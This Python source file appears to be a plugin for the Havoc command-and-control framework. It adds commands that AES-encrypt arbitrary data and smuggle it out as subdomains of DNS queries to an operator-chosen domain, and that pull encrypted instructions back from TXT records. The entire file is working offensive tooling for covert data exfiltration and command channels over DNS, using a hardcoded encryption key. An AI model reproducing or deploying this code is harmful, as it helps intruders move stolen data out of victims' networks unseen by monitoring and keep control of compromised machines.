from havoc import Demon, RegisterCommand, Plugin
import dns.resolver
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# AES encryption key (must be 16, 24, or 32 bytes long)
AES_KEY = b'ThisIsASecretKey'

def encrypt_data(data, key):
    """
    Encrypts data using AES encryption.
    """
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        ciphertext = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ciphertext).decode()
    except Exception as e:
        return f"[-] Error encrypting data: {e}"

def decrypt_data(encrypted_data, key):
    """
    Decrypts data using AES encryption.
    """
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        iv = encrypted_data[:AES.block_size]
        ciphertext = encrypted_data[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext.decode()
    except Exception as e:
        return f"[-] Error decrypting data: {e}"

def send_dns_query(domain, data):
    """
    Sends data through a DNS query.
    """
    try:
        # Encrypt the data before sending
        encrypted_data = encrypt_data(data, AES_KEY)
        if encrypted_data.startswith("[-]"):
            return encrypted_data

        # Create a DNS query with the encrypted data as a subdomain
        query = f"{encrypted_data}.{domain}"
        dns.resolver.resolve(query, 'A')

        return f"[+] Data sent successfully: {data}"
    except dns.resolver.NoAnswer:
        return f"[-] No answer received for DNS query: {query}"
    except Exception as e:
        return f"[-] Error sending DNS query: {e}"

def receive_dns_response(domain):
    """
    Receives data through a DNS response.
    """
    try:
        # Create a DNS query to receive data
        query = f"request.{domain}"
        answers = dns.resolver.resolve(query, 'TXT')

        # Decrypt the received data
        encrypted_data = answers[0].strings[0].decode()
        decrypted_data = decrypt_data(encrypted_data, AES_KEY)
        if decrypted_data.startswith("[-]"):
            return decrypted_data

        return f"[+] Data received successfully: {decrypted_data}"
    except dns.resolver.NoAnswer:
        return f"[-] No answer received for DNS query: {query}"
    except Exception as e:
        return f"[-] Error receiving DNS response: {e}"

# Havoc C2 Integration
def send_dns_query_command(demon, *args):
    """
    Command to send data through a DNS query.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: send_dns_query [domain] [data]")
        return

    domain = args[0]
    data = args[1]

    result = send_dns_query(domain, data)
    demon.ConsoleWrite(result)

def receive_dns_response_command(demon, *args):
    """
    Command to receive data through a DNS response.
    """
    if len(args) != 1:
        demon.ConsoleWrite("[-] Usage: receive_dns_response [domain]")
        return

    domain = args[0]

    result = receive_dns_response(domain)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("send_dns_query", "Send data through a DNS query", send_dns_query_command)
    RegisterCommand("receive_dns_response", "Receive data through a DNS response", receive_dns_response_command)

# Initialize the plugin
plugin = Plugin("DNSTunnel", "Advanced DNS tunneling techniques", initialize)